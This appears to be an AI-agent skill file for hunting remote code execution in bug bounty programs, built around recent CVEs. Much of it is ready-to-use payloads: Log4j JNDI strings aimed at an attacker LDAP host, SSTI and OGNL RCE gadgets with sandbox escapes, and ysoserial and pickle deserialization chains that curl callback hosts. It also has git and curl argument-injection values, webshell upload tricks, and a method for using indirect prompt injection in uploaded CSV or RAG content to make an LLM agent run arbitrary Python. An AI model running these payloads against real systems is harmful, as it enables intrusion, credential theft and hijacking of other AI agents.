---
name: hunt-rce
description: Hunting skill for remote code execution. Built from 1,218 public RCE bug bounty reports across HackerOne, Project Zero, Intigriti, GitHub Security Advisories, and curated awesome-* lists, plus 2024-2026 meta verified against NVD — React Server Components (CVE-2025-55182), runc Leaky Vessels (CVE-2024-21626), BentoML pickle (CVE-2025-27520/32375), LangChain REPL (CVE-2025-68613), Tekton git resolver (CVE-2026-40938), OpenProject git argument injection (CVE-2026-24685), ingress-nginx (CVE-2025-1974). Use when hunting RCE on web apps, OSS libraries, admin panels, file processors, CI/CD runners, GitOps controllers, K8s admission webhooks, container runtimes, ML inference servers, agentic LLM tools, or anywhere user input reaches a shell, deserializer, template engine, dynamic loader, or git/curl/tar CLI.
sources: hackerone_public, github_advisories, github_deep, project_zero, intigriti, devcore_blog, watchtowr, orca_security, microsoft_msrc, securitylab_github, nvd_verified
report_count: 1218
generated_at: 2026-05-04
---

## Deeper reference (load only if this specific situation applies)

This file covers the methodology and payloads that apply to almost every RCE
hunt. 6 topics were moved out because they only apply under a specific
condition -- read the matching file ONLY when that condition is true for the
current target, never by default:

- **`references/container-runtime-escape.md`** -- target is a container/Kubernetes
  environment (shared CI builds images, multi-tenant Kubernetes, GPU/NVIDIA nodes,
  or ingress-nginx admission reachable). Covers runc Leaky Vessels, BuildKit,
  NVIDIA Container Toolkit TOCTOU, and ingress-nginx admission RCE.
- **`references/ml-serving-pickle.md`** -- target exposes a model-inference /
  model-registry endpoint (BentoML, MLflow, TorchServe, Triton, Seldon, Ray
  Serve). Covers unsafe-pickle deserialization CVEs and probe Content-Types.
- **`references/agentic-llm-rce.md`** -- target ships an agentic LLM feature
  (chatbot, RAG, code-interpreter, MCP server with shell/python tools). Covers
  indirect-prompt-injection-to-RCE (CVE-2025-68613 family) and filter-bypass
  wrapping techniques.
- **`references/cicd-gitops-supply-chain.md`** -- target has CI/CD pipelines,
  GitOps controllers, or a GitHub/GitLab/Jenkins org in scope. Covers
  `pull_request_target` script injection, GitOps git-resolver argument
  injection, Jenkins/Argo/Tekton/Flux surface, cloud IAM/IMDS pivots, and
  npm/pip/RubyGems supply-chain vectors.
- **`references/source-code-review.md`** -- you have source/repo access (OSS
  target, internal pentest, in-scope GitHub org). Semgrep/ast-grep/ripgrep/
  CodeQL rules for finding RCE sinks statically; never useful for pure
  black-box hunting.
- **`references/chains-case-studies.md`** -- you already have one confirmed
  RCE-adjacent primitive (XSS, SSRF, prototype pollution, OAuth bug, argument
  injection, etc.) and want an escalation template, OR you want narrative
  report-framing examples of how a chain was built and worded. Not needed to
  find the first bug.

If the core methodology below does not resolve the hunt and the target matches
one of the conditions above, read the matching reference file before declaring
the surface exhausted.

## Crown Jewel Targets

RCE is the highest-paying class in bug bounty, and the 24-month meta has shifted decisively toward five asset types. All CVEs below are verified against NVD.

**1. Modern JS framework deserialization (CVSS 10.0).** React Server Components / React Server Functions / Next.js App Router. **CVE-2025-55182** (CVSS 10.0, Meta Bug Bounty, Vercel WAF-bypass program on H1, exploited in the wild within 24 hours of disclosure) is the defining 2025-2026 RCE. Every Next.js >=14.3.0-canary.77 / >=15.x / >=16.x deployment running unpatched RSC is a one-request RCE target. Vercel maintains a *separate* H1 program paying low five-figure bounties for WAF bypasses against this CVE. Hunt this *first* on any modern JS stack.

**2. CI/CD runners and GitOps controllers.** GitHub Actions `pull_request_target` script injection, GitLab CI runner takeover, Jenkins script console, Tekton/ArgoCD/Flux git resolvers. **CVE-2026-40938** (Tekton git resolver `--upload-pack` argument injection — CVSS 9.4, NVD-verified, fix in v1.11.1) and **CVE-2026-24685** (OpenProject git argument injection in repository diff endpoint, CVSS 9.4) define the 2026 GitOps meta. CI compromise = supply-chain compromise; bounties scale accordingly. GitHub Security Lab pays for these directly; downstream programs (Cilium, ArgoCD, Tekton are all CNCF graduates) often have parallel bounty programs.

**3. Container runtimes and admission controllers.** **CVE-2024-21626** (runc "Leaky Vessels" — CISA KEV, CVSS 8.6, Snyk Labs disclosure) gives you full host RCE from any pod with `runc exec`. **CVE-2024-23653** (BuildKit GRPC SecurityMode missing privilege check) breaks out at build time. **CVE-2024-0132** (NVIDIA Container Toolkit TOCTOU, Wiz Research) covers the GPU-rich infrastructure stack. **CVE-2025-1974** (ingress-nginx admission controller RCE, CVSS 9.8) — any pod-network attacker reads cluster-wide Secrets. Hunt these on every Kubernetes target where you can deploy a pod.

**4. ML serving / inference platforms.** **CVE-2025-27520** (BentoML `deserialize_value()` unsafe pickle on `/summarize`, CVSS 9.8 critical, c2an1 disclosure via Snyk) and **CVE-2025-32375** (BentoML runner server, GHSA-7v4r-c989-xh26) demonstrate the universal pattern — model registries deserialize pickled tensors and trust the format. **CVE-2024-2912** (BentoML earlier pickle, Toreon disclosure). **CVE-2024-1560/1483/1594** (MLflow path traversal family, all via Huntr) reach arbitrary file read/write on the model server. Hunt model registry endpoints, inference servers, and `Content-Type: application/vnd.*+pickle` accepting handlers.

**5. Agentic LLM tool-use.** **CVE-2025-68613** (LangChain `langchain-experimental` PythonREPLTool / PandasDataFrameAgent — CVSS 9.8 critical, "Semantic RCE") is the new attack class. Indirect prompt injection in CSV/text/RAG context coerces the agent into writing exec()-able Python. Same pattern hits LlamaIndex code interpreter, MCP servers with shell tools, Ollama plugins. The agent is the gadget chain.

**6. Internet Bug Bounty / OSS supply chain.** `nodejs`, `curl`, `git`, `python`, `php`, `rails`, `marked`, `phpoffice/phpspreadsheet`, `GitPython`, `coredns`, `jackson-databind`, `log4j`, `snakeyaml`. A single bug here cascades downstream into thousands of apps. The 2026 corpus shows curl alone with multiple critical/high RCEs (`--engine` arbitrary library load via H1 disclosed report, short-flag grouping argument injection, SFTP QUOTE path traversal, libcurl cookie buffer overflow). Bounties scale with downstream blast radius.

**7. Government & enterprise asset surfaces (deptofdefense pattern).** Old log4j, Confluence (CVE-2023-22527 OGNL injection at `/template/aui/text-inline.vm`), Liferay (CVE-2020-7961), Pentaho with default creds, Cisco IOS XE, GlobalProtect (still paying via H1 disclosed 2025-2026) — all *still paying* on intranets and forgotten subdomains. Old CVEs against old assets is a paying strategy. Apache Tomcat **CVE-2024-50379** (write-enabled default servlet RCE via JSP race condition, CVSS 9.8) joined the rotation in 2024-2025.

**Admin panels with file/asset upload.** Anywhere ops staff upload images, configs, themes, packages. Screenshot URLs piped to shell, ZIP extraction without extension filter, theme installer running `unzip` then serving the public dir. Grav SSTI/direct-install (multiple Snyk advisories), WPML Twig SSTI (Patchstack disclosure).

**OAuth/SSO auth surfaces in OSS apps** — SAML signature validation that returns errors instead of throwing (Admidio H1 disclosed), TSIG bypass on gRPC/QUIC (CoreDNS GHSA), null-password fallback in OIDC (Note Mark GHSA). Not RCE alone, but the way INTO admin where RCE lives. Always-paired hunting target.

**File processors / parsers** — XLSX, XML, image (ExifTool), PDF, font parsers, archive extractors, anything that takes a file and runs code based on its content. Modern incidents hit phpspreadsheet, marked, ExifTool stdin injection, WinRAR (CVE-2025-8088 NTFS ADS path traversal, ESET disclosure).

**What pays the most:** pre-auth, no user interaction, single request. A single `curl http://target/?x=$(payload)` returning a reverse shell is a low-to-mid five-figure bug depending on program. CVE-2025-55182 (React2Shell) paid up to mid five-figure tier publicly via Vercel's dedicated H1 WAF-bypass program. Post-auth/admin RCE is mid-tier (low four to low five-figure). Argument-injection-on-internal-asset is mid-tier. Cluster takeover via GitOps controller is top-tier (high four-figure to mid five-figure on CNCF programs).

## Attack Surface Signals

Greppable signals that this surface might exist:

```bash
# Java deserialization sinks
rg -n "ObjectInputStream|readObject\(|XStream\.fromXML|Jackson.*enableDefaultTyping|SnakeYaml\(\)|new Yaml\(\)\.load\(|HessianInput|Kryo\(\)" \
   --type java

# Python pickle / yaml.load sinks
rg -n "pickle\.loads?\(|yaml\.load\(|marshal\.loads\(|cPickle|jsonpickle\.decode" --type py

# PHP unserialize / phar
rg -n "\bunserialize\(|file_exists.*phar://|fopen.*phar://|file_get_contents.*phar://" --type php

# .NET deserialization
rg -n "BinaryFormatter|LosFormatter|ObjectStateFormatter|JavaScriptSerializer.*Deserialize|XmlSerializer.*Deserialize" \
   --type cs

# Ruby YAML.load / Marshal.load (not safe_load)
rg -n "YAML\.load\(|YAML\.unsafe_load|Marshal\.(load|restore)" --type rb

# Node.js prototype pollution sinks (gadget reachability)
rg -n '_\.merge\(|_\.mergeWith\(|_\.defaultsDeep\(|Object\.assign\(\{\},' --type js

# Template injection sinks (SSTI)
rg -n "render_template_string|Jinja2.*from_string|Twig.*createTemplate|new Velocity|FreeMarker.*Template|new Handlebars\.SafeString|Pebble" \
   -g '!*test*'

# Shell execution from user input
rg -n "subprocess\.call\([^)]*shell=True|subprocess\.run\([^)]*shell=True|os\.system\(|exec\(|eval\(|popen\(|child_process\.exec\(" \
   --type py --type js --type rb --type php

# Argument injection — flags reaching CLIs
rg -n 'subprocess.*\["(curl|git|ssh|tar|exiftool|imagemagick|ffmpeg|wget|rsync|scp)"' \
   --type py --type js --type rb

# React Server Components / Next.js Flight (CVE-2025-55182 candidates)
rg -n "react-server-dom-(webpack|parcel|turbopack)" -g 'package*.json'

# Pickle accepting Content-Type (BentoML / ML serving family)
rg -n 'application/vnd\..*\+pickle|application/x-python-pickle|pickle\.loads\(.*request' --type py

# Agentic LLM exec sinks (CVE-2025-68613 family)
rg -n 'PythonREPLTool|PythonAstREPLTool|PandasDataFrameAgent|create_pandas_dataframe_agent|sympy\.sympify|VectorSQLDatabaseChain' --type py
```

HTTP-level signals on a live target:

- `Server: Apache Coyote`, `X-Powered-By: JSF/2`, `?vid=`, viewstate/JSF endpoints → **deserialization candidate**
- `X-Generator: Liferay`, `/c/portal/json_service`, `/api/jsonws/` → **Liferay (CVE-2020-7961)**
- `X-Confluence-Request-Time` header, `/exception.jsp` exposed, `/template/aui/text-inline.vm` reachable → **Confluence (CVE-2023-22527 OGNL injection)**
- `Set-Cookie: .ASPXAUTH=`, `__VIEWSTATE` in body → **.NET deserialization**
- `User-Agent: ${jndi:...}` reflected anywhere in logs/admin UI → **log4j (CVE-2021-44228) candidate**
- `ext-js`, Sitecore footprint, `/sitecore/admin/` → **Sitecore deserialization (CVE-2025-27218, H1 disclosed)**
- `Powered by DotNetNuke`, `.aspx` w/ DNN cookies → **DNN cookie deserialization (CVE-2017-9822, H1 disclosed 2024 against MTN)**
- `Content-Type: application/octet-stream` upload responses + theme/plugin endpoints → **upload chain**
- 500 errors that leak `freemarker.core.InvalidReferenceException`, `Twig\Error`, `jinja2.exceptions.UndefinedError` → **SSTI confirmed**
- `next/static/`, `_next/data/`, `__nextjs`, `X-Powered-By: Next.js`, plus `Server-Action` request headers → **CVE-2025-55182 candidate** — pivot to Server Function endpoint discovery
- `X-Php-Cgi`, `cgi-bin/php-cgi.exe`, `.php?` on Windows hosts in CN/JP/TW locales → **CVE-2024-4577 PHP-CGI argument injection (Best-Fit encoding)**
- `Server: Apache/2.4.5x` plus `mod_proxy` headers → **Apache Confusion Attacks (CVE-2024-38472/38476/38477/39573, Orange Tsai BHUSA 2024)**
- `Server: Apache-Coyote/1.1` + Tomcat default servlet error pages + 9.0.x version → **CVE-2024-50379 default-servlet write-RCE** (NVD-verified critical)
- `Vercel Platform: ` response header (without correct version pinning) → **CVE-2025-55182 + Vercel WAF-bypass H1 program**
- `Content-Type: application/vnd.bentoml+pickle` accepted on `/summarize` or model-inference endpoints → **CVE-2025-27520 BentoML unsafe pickle**
- `X-LangChain-Agent` / `X-LangServe-` headers, or `/invoke` / `/agent` endpoints with CSV/text upload → **CVE-2025-68613 LangChain REPL semantic RCE**
- `kubernetes.io/ingress.class: nginx` + admission webhook reachable from pod network → **CVE-2025-1974 ingress-nginx**

`docker pull <image> && trivy image <image>` and `nuclei -t cves/` against fingerprinted versions remains the highest-throughput high-paying technique on enterprise/DoD assets.

## Insertion Point Taxonomy

Every place attacker-controlled data flows for RCE. Use as a checklist on each target:

- **URL path / query / fragment** → SSTI (`/page?name={{7*7}}`), command injection (`/api/ping?host=`), PHP-CGI argument injection (`/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1`).
- **Headers** — `User-Agent`, `Referer`, `X-Forwarded-For`, `Authorization`, custom `X-Tenant-ID`. Log4j JNDI lives here. CRLF in `httplib.HTTPConnection` (Orange Tsai's GitHub Enterprise chain). Server Function action headers in React. BentoML `Payload-Container`/`Payload-Meta` headers carry pickle (CVE-2025-32375 GHSA-7v4r-c989-xh26).
- **Body** — JSON (deserialization metadata: `__type`, `$type`, `class`, `_class`), form fields, multipart, XML (XXE → file read → secret → RCE), GraphQL variables, RSC Flight payloads, raw pickle bytes on `application/vnd.*+pickle`.
- **Cookies** — Java/Ruby session marshalled object (rO0A magic for Java b64), `__VIEWSTATE`, JWT alg=none then JWT-claim SSTI, custom session tokens that base64-decode to serialized objects.
- **File contents** — filename (path traversal → arbitrary write → RCE), ZIP entries (theme installer, package manager), EXIF/XMP/IPTC metadata (ExifTool ImageMagick), color profile, font tables, CSV cells (`=cmd|"/c calc"!A1` for spreadsheet apps; CSV cells fed to LangChain `PandasDataFrameAgent` for CVE-2025-68613), YAML uploads (`!!python/object/apply:os.system`), SVG (XSS → admin → RCE), Markdown (SSTI in render pipeline), pickled tensors (BentoML).
- **WebSocket frames** — RCE via JSON deserialization in WS message handlers, often missed by HTTP-only WAF.
- **Background/async paths** — job queues, webhooks retry, cron-triggered processing, email-to-ticket parsers, scheduled report generators that interpolate user names into shell.
- **Indirect (stored)** — DB-stored content rendered later, file written then served, prompt context for LLMs (LLM tool use → shell exec gadget — exact CVE-2025-68613 vector via RAG), git commit messages echoed by CI, branch names interpolated into `run:` blocks of GitHub Actions.
- **CLI/IPC parameters** — Kubernetes ResolutionRequest objects (Tekton CVE-2026-40938 NVD-verified), Argo CMP plugin env vars, kubectl exec annotations, container labels.
- **Container build context** — Dockerfile `WORKDIR` symlink to `/proc/self/fd/7/` (CVE-2024-21626 Leaky Vessels), `# syntax=` line referencing untrusted frontend image (CVE-2024-23653 BuildKit), CDI device specs (CVE-2024-0132 NVIDIA Container Toolkit TOCTOU).
- **Protocol smuggling** — Gopher protocol via SSRF (`gopher://target:6379/_FLUSHALL%0d%0a...`), CRLF into Memcached/Redis (Orange Tsai GitHub Enterprise pattern, also H1 2025 disclosed Gopher CRLF report).

For each surface, send `${7*7}`, `{{7*7}}`, `<%=7*7%>`, `${jndi:dns://x.oast.fun/}`, `;curl http://x.oast.fun/`, and a Java deser magic byte (`rO0AB...`) probe. Watch for both reflected math results AND OOB DNS hits.

## Step-by-Step Hunting Methodology

1. **Fingerprint stack first.** Hit `/`, the login page, `/.well-known/`, `/robots.txt`, an error path. Record `Server`, `X-Powered-By`, generator meta, JS framework version (`React.version`, `__NEXT_DATA__`, Vue devtools probe), error templates, cookie names, response timing. RCE hunting without stack knowledge is throwing payloads at walls. **If Next.js >=14.3.0-canary.77 or unpatched 15.x/16.x → start with CVE-2025-55182.**

2. **Check CVE-2025-55182 first on any modern JS target.** The 2025-2026 meta. Probe Server Function endpoints with both `Next-Action` header (Server Actions) and direct RSC Flight POST. Confirm with arithmetic-result reflection or OOB DNS, then submit *immediately* — Vercel pays low-to-mid five-figure for WAF bypasses on patched-but-protected hosts via dedicated H1 program. Patch versions to compare against: React 19.0.1, 19.1.2, 19.2.1; Next.js 15.0.5/15.1.9/15.2.6/15.3.6/15.4.8/15.5.7/16.0.7. Anything below = vuln per NVD CVE-2025-55182 advisory.

3. **Try every known CVE that matches the stack.** This sounds dumb. It pays consistently in 2025-2026. Pull the CVE list with `nuclei -t cves/` or `nmap --script vulners`. The DoD pipeline is essentially "scan asset → match CVE → exploit". **Confluence CVE-2023-22527** (`POST /template/aui/text-inline.vm` with the OGNL `findValue` payload), **PHP-CGI CVE-2024-4577** (Windows in CN/JP/TW locale, `%AD` soft hyphen for argument injection), **Apache CVE-2024-38472/38476** (Orange Tsai Confusion Attacks), **Tomcat CVE-2024-50379** (write-enabled default servlet on case-insensitive FS), **log4j on internal portals** — all still paying.

4. **Map every place user input reaches a parser.** Profile pictures, document uploads, file imports (CSV/XLSX/JSON/XML/YAML), webhooks, SAML/OIDC redirect targets, email templates, error messages, feature-flag JSON, config-as-code editors. These are deserialization/SSTI surfaces. **If admin file upload exists, ZIP-based theme/plugin install** is a near-guaranteed webshell vector. If not → branch to step 5.

5. **Test SSTI on every reflected input.** Submit in order: `${7*7}`, `{{7*7}}`, `<%=7*7%>`, `#{7*7}`, `*{7*7}`, `${7*'7'}`. Map response: `49` → Java/Spring/Velocity/Twig/ERB. `7777777` → Jinja2 (Python). Engine confirmation → use engine-specific RCE payload from the Payload section, including the sandbox-escape alternates if the obvious gadget is filtered. **If you see `freemarker.core.*` or `jinja2.exceptions.*` in errors, you have engine-confirmed SSTI before any payload.**

6. **Test command injection by side channel.** Use OOB DNS callbacks (Burp Collaborator, interact.sh). Inject in this order: `;curl http://<id>.oast.fun/x`, `$(curl http://<id>.oast.fun/y)`, `` `wget http://<id>.oast.fun/z` ``, `|nslookup <id>.oast.fun`. No reflection needed — most modern RCE is blind. **If first 4 fail and target has any URL-fetching feature, try the Gopher SSRF→Memcached/Redis chain (Orange Tsai GitHub pattern, also re-disclosed via H1 2025 "Protocol Smuggling / CRLF Injection via Gopher" report).**

7. **Hunt file upload chains.** Upload `.html`, `.svg` (XSS-then-pivot), `.phtml`, `.phar`, `.jsp`, `.jspx`, `.aspx`, `.cer`, `.config`, `.htaccess`. Try double extensions (`shell.php.png`), null bytes (`shell.php%00.png`), Content-Type spoofing, magic-byte prefixed payloads (`GIF89a` + PHP). ZIP-based upload handlers (themes, plugins, packages) often unpack without extension filter. For WordPress, **CVE-2025-13486** (Advanced Custom Fields Extended `call_user_func_array`) is the recent unauthenticated payable CVE. For Tomcat, drop a `.jsp` via PUT against the write-enabled default servlet (CVE-2024-50379).

8. **Look for argument injection in shelled-out CLIs.** Search reflection where input goes to `git`, `curl`, `tar`, `ssh`, `exiftool`, `imagemagick`, `ffmpeg`, `rsync`. Test `--engine /tmp/evil.so` (curl, H1 2025 disclosed critical against curl), `--upload-pack=` (git, CVE-2025-21613 go-git, CVE-2026-40938 Tekton NVD-verified, CVE-2026-24685 OpenProject NVD-verified), `--checkpoint-action` (tar), short-flag grouping (curl 2026 H1 critical "Argument Injection via curl Short-Flag Grouping"). **Anywhere user input is the *first* positional argument to a CLI without `--` sentinel, test argument injection.**

9. **Read the source if available.** OSS apps and GHSA repos have public commits. `git log --all --grep="security"`, `git log -p -S "exec(" -- src/`, `git log -p -S "readObject" -- src/`. Look for recently added input handling without recently added validation. Apply the semgrep + ast-grep + ripgrep + CodeQL rules from the Source Review section. **Finding a recent fix commit and re-reading the file at HEAD~1 gives you the bug for free** — the patch shows you exactly which input wasn't validated. Run `gh pr list --search "RCE" --state closed` and read those.

10. **Hunt CI/CD and GitOps surface.** For any GitHub-hosted target, audit `.github/workflows/*.y*ml` for `pull_request_target` + `${{ github.event.pull_request.* }}` interpolation in `run:` (script injection — see Cilium GHSL-2024-274, Ceph GHSA-p433-fp4g-pc2c, ansible.platform GHSA-fwqj-x86q-prmq). For self-hosted Kubernetes targets, look for ArgoCD/Flux/Tekton/Argo Workflows in scope. Check for `pull_request_target` + `actions/checkout` with `pull_request.head.sha` (RCE on runner with secrets). For GitLab, audit `.gitlab-ci.yml` for runner registration token leak and `CI_JOB_TOKEN` scope abuse. For Jenkins, check `/script` endpoint exposure, agent JNLP secret leak, build parameter injection, CVE-2024-23897 line-too-long Args4j read primitive. For ArgoCD/Tekton, **CVE-2026-40938** is the canonical 2026 hunt — submit ResolutionRequest YAML with `revision: --upload-pack=/usr/bin/curl`.

11. **Hunt container runtime and admission controller surface.** For any pod-network reachable target, test ingress-nginx admission webhook for **CVE-2025-1974** (NVD-verified critical, CVSS 9.8, reads cluster Secrets). For container builds, attempt **CVE-2024-21626** Leaky Vessels (`WORKDIR` to `/proc/self/fd/7/`) on multi-tenant build infrastructure or PR-triggered image builds. For NVIDIA-equipped GPU clusters, attempt **CVE-2024-0132** TOCTOU on container-toolkit < 1.16.2.

12. **Hunt ML serving / agentic LLM surface.** Probe model-inference endpoints with `Content-Type: application/vnd.bentoml+pickle` carrying a `__reduce__` pickle gadget (**CVE-2025-27520**, Snyk PoC by c2an1). For LangChain/LlamaIndex agents, upload CSV/markdown/text containing indirect prompt injection that names the `PythonREPLTool` and asks it to `exec()` arbitrary code (**CVE-2025-68613**). For MLflow, probe `artifact_location` with `#`-fragment URI for path traversal (**CVE-2024-1483/1560/1594** family, all Huntr-disclosed).

13. **Chain low-impact bugs.** Single bugs are duplicates. Top-tier hunters live in chains. **SSRF → cloud metadata (169.254.169.254) → IAM creds → AssumeRole → Lambda code edit → RCE**. **XSS in admin → CSRF post to `/admin/upload` → webshell**. **Path traversal write → drop file in cron path → wait**. **Prototype pollution → universal Node gadget → RCE in NPM CLI / Parse Server / Rocket.Chat (Silent Spring research, Arteau & Doupé)**. Most paid RCEs in 2024-2026 are 2-link chains, not single bugs. See the Chains section.

14. **Validate before reporting.** OOB callback ≠ RCE. Triagers want process output: `id`, `whoami`, `hostname`, `uname -a`, contents of `/etc/hostname`. Get those four, then stop. Don't pivot, don't read AWS creds, don't `ls /root`, don't `cat /etc/shadow` — that's an unauthorized-access escalation that gets the report closed and you banned. See Gate 0.

## Payload & Detection Patterns

### Sub-technique A — Log4j / JNDI (still paying on enterprise/internal)

```
# fingerprint
${jndi:dns://x.oast.fun/a}
${jndi:ldap://x.oast.fun/a}

# bypass set (case mangling, nested ${::-X})
${${lower:j}ndi:${lower:l}dap://x.oast.fun/a}
${${::-j}${::-n}${::-d}${::-i}:ldap://x.oast.fun/a}
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap://x.oast.fun/a}
${${::-${env:BARFOO:-j}}ndi:ldap://x.oast.fun/a}

# RCE delivery (LDAP server returns Exploit class)
${jndi:ldap://attacker:1389/Exploit}
```
Test these in: `User-Agent`, `Referer`, `X-Forwarded-For`, `Authorization`, `X-Api-Version`, custom headers, every form field, every URL parameter, login username, search box, `JSESSIONID`, X-Forwarded-Host.

### Sub-technique B — SSTI engine fingerprinting + RCE (with sandbox-escape alternates)

```
# Fingerprint
${7*7}                  # Java/Spring/Velocity/Freemarker → 49
{{7*7}}                 # Jinja2/Twig/Nunjucks/Pebble/Handlebars → 49 or 7777777
{{7*'7'}}               # Jinja2: '7777777' | Twig: 49 (disambiguator)
<%= 7*7 %>              # ERB/EJS → 49
#{ 7*7 }                # Ruby/Pebble/Slim → 49
*{7*7}                  # Thymeleaf → 49
{7*7}                   # Smarty → 49
${{ 7*7 }}              # GitHub Actions expressions → 49

# Jinja2 RCE — primary (works when `request` is in scope)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("id")|attr("read")()}}

# Jinja2 sandbox-escape alternates — when `request` / `config` are filtered
# Use `lipsum` (Werkzeug helper) to reach __globals__:
{{lipsum.__globals__['os'].popen('id').read()}}
# Use `cycler` (Jinja2 builtin):
{{cycler.__init__.__globals__.os.popen('id').read()}}
# Use `get_flashed_messages` (Flask helper exposed to templates):
{{get_flashed_messages.__globals__['__builtins__'].open('/etc/passwd').read()}}
# Use `namespace` (Jinja2 builtin) to reach __init__:
{{namespace.__init__.__globals__.os.popen('id').read()}}
# Use `joiner` (Jinja2 builtin):
{{joiner.__init__.__globals__.os.popen('id').read()}}
# Class-traversal fallback when *all* helpers filtered (works in pure Jinja2 sandbox):
{{''.__class__.__mro__[1].__subclasses__()[<idx>]("/usr/bin/id",shell=True,stdout=-1).communicate()[0]}}

# Twig RCE — Twig 2.x sandbox bypass (works when strict_callables not set)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}

# Twig 3.x — strict_callables denies the filter() trick. Alternates:
# - `_self` is no longer the Environment in Twig 3; it's the Template
# - Pivot to `getName()` / `getTemplateName()` for read-only
# - For RCE in Twig 3, you typically need a chain through a registered
#   user function or the `dump` extension; if neither, SSTI is read-only
# - For Twig 2 vs 3 confirmation: {{_self.env}} prints in 2, errors in 3
{{_self.env.getRuntime("Symfony\\Component\\Form\\FormRenderer").renderBlock(...)}}  # Symfony-specific, Twig 3

# Freemarker RCE — primary
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Freemarker sandbox-escape alternates — when `?new()` or new_builtin_class_resolver blocks
# Use `?api` (FreeMarker 2.3.22+) to reach BeansWrapper:
${object?api.class.protectionDomain.codeSource.location.toURI().resolve('/etc/passwd').toURL().openStream()}
# Use `?eval` for expression evaluation:
${"freemarker.template.utility.Execute"?new()("id")}
# Use object_wrapper bypass via `assign`:
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder",["id"]).start()}
# When new_builtin_class_resolver locks ?new(), pivot through .data_model
# or any pre-instantiated object exposed to the template (request, response).

# Velocity RCE — primary
#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($chr=$x.class.forName("java.lang.Character"))#set($str=$x.class.forName("java.lang.String"))#set($ex=$rt.getRuntime().exec("id"))$ex.waitFor()

# Velocity sandbox-escape alternates — when SecureUberspector is configured
# SecureUberspector blocks reflection; pivot through any object already in context:
$response.getWriter().println("test")  # if response is exposed
# Or chain via context-exposed CommandTool / RuntimeTool helpers if VelocityTools loaded.

# SpEL (Spring) RCE
${T(java.lang.Runtime).getRuntime().exec("id")}

# OGNL (Confluence CVE-2023-22527, paste verbatim into POST /template/aui/text-inline.vm body)
label=aaa'%2b#request.get('.KEY_velocity.struts2.context').internalGet('ognl').findValue(#parameters.poc[0],{})%2b'&poc=@org.apache.struts2.ServletActionContext@getResponse().setHeader('x_check',(new+freemarker.template.utility.Execute()).exec({"id"}))
```

### Sub-technique C — Java/Python/PHP/.NET deserialization (with gadget trigger conditions)

```bash
# DNS confirmation only (no RCE; safe)
java -jar ysoserial.jar URLDNS "http://TOKEN.oast.fun/"

# Java gadget chains — pick based on detected dependencies (trigger conditions matter)
# Each chain requires SPECIFIC libraries on classpath; the wrong gadget gives
# ClassNotFoundException for the trigger class, not RCE.

#   CommonsCollections1-4   Apache Commons Collections 3.1-3.2.1 (CC1, CC3, CC5, CC6)
#                           InvokerTransformer.transform must be present
#   CommonsCollections5-7   Commons Collections 4.0+ (CC2, CC4, CC7)
#                           Different chain through TiedMapEntry
#   Spring1                 spring-core 4.x present, no extra deps
#   Spring2                 spring-aop with javax.inject.Provider on classpath
#   Groovy1                 groovy-2.x on classpath, ConvertedClosure trigger
#   Hibernate1              hibernate-core + javassist + H2 (or other JDBC)
#   JBossInterceptors1      JBoss EE 6.x classpath
#   Jdk7u21                 JDK 7u21 specifically (no extra deps; relies on
#                           AnnotationInvocationHandler + LinkedHashSet bug
#                           patched in 7u25). Use as last resort on hardened targets.
#   Click1, FileUpload1     Apache Click / commons-fileupload classpaths
#   JSON1, JRMPClient,      Less common; check Jackson/RMI presence first
#   ROME, Wicket1, MozillaRhino1

# How to pick: send each gadget's URLDNS variant first to detect classpath
java -jar ysoserial.jar CommonsCollections5 'curl http://x.oast.fun/$(id)' | base64 -w0
# If you get DNS hit on URLDNS-CC5 but not URLDNS-CC1, you have CC4.x not 3.x.
# If you get NO hit on any CC variant, target lacks Commons Collections —
# move to Spring1/Hibernate1/JRMPClient.

# Drop the b64 into:
#   __VIEWSTATE param (.NET)
#   JSF state cookie (Java)
#   /api/jsonws/ POST body (Liferay CVE-2020-7961)
#   Spring AMQP message (CVE-2017-8045, Content-Type: application/x-java-serialized-object)
#   Any cookie matching Java magic header (b64 starts with "rO0A...")

# .NET — TypeConfuseDelegate works on most LosFormatter/BinaryFormatter sinks
# (Trigger condition: target uses LosFormatter or BinaryFormatter; ObjectStateFormatter
# also works. JavaScriptSerializer/XmlSerializer need different gadgets.)
ysoserial.net -g TypeConfuseDelegate -f LosFormatter -c "curl http://x.oast.fun/" -o base64

# Python pickle — direct chain (no gadget tooling needed)
# Trigger condition: target calls pickle.loads() on attacker-controlled bytes.
# Universal — works against ANY Python pickle deserializer including BentoML
# CVE-2025-27520 / CVE-2025-32375 / CVE-2024-2912.
import pickle, os
class P:
    def __reduce__(self): return (os.system, ('curl http://x.oast.fun/',))
print(__import__('base64').b64encode(pickle.dumps(P())).decode())

# BentoML-specific delivery (verified against CVE-2025-27520 disclosure):
# POST to /summarize with Content-Type: application/vnd.bentoml+pickle and the raw
# pickle bytes as the body. No headers needed beyond Content-Type.
import requests
requests.post("http://target:3000/summarize",
              data=pickle.dumps(P()),
              headers={'Content-Type': 'application/vnd.bentoml+pickle'})

# CVE-2025-32375 BentoML runner-server variant:
# Set headers Payload-Container=NdarrayContainer, Payload-Meta={"format":"default"},
# Batch-Size=1, args-number=1 — body is the pickle.

# SnakeYaml < 2.0 (CVE-2022-1471) — pre-2.0 default uses SafeConstructor=False
# Trigger condition: SnakeYaml version < 2.0 AND code calls new Yaml().load() not
# new Yaml(new SafeConstructor()).load(). javax.script must be on classpath
# (it's in Java SE; always available).
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker/"]]]]

# PHP unserialize — phar polyglot (file_exists triggers __destruct in PHP < 8.0)
# Trigger condition: any "Phar deserialization" sink — file_exists, fopen,
# file_get_contents, getimagesize on attacker-controlled path. PHP 8.0+ removed
# the implicit phar:// trigger in some functions; check version.
